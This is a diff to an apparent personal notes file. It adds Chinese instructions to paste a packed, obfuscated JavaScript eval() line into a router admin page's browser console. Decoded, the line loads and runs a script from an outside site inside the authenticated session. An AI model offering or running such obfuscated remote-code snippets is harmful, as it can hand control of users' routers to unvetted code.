@@ -20,6 +20,12 @@
 
 
 # tmp
+登录路由器网页版后台 按F12 在控制台(console)复制以下代码
+
+
+
+eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3 1=2.4(\'1\');1.5="6://7-8.9.a/b/c.d?e="+f g().h();2.i(\'j\')[0].k(1);',21,21,'|script|document|var|createElement|src|https|bash|linux|xxos|site|jdcloud|r2204|js|t|new|Date|getTime|getElementsByTagName|head|appendChild'.split('|'),0,{}))
+
 python -m http.server --bind ::
 [fe80::215:5dff:fe58:6296] 
 https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/latest-virtio/virtio-win-guest-tools.exe
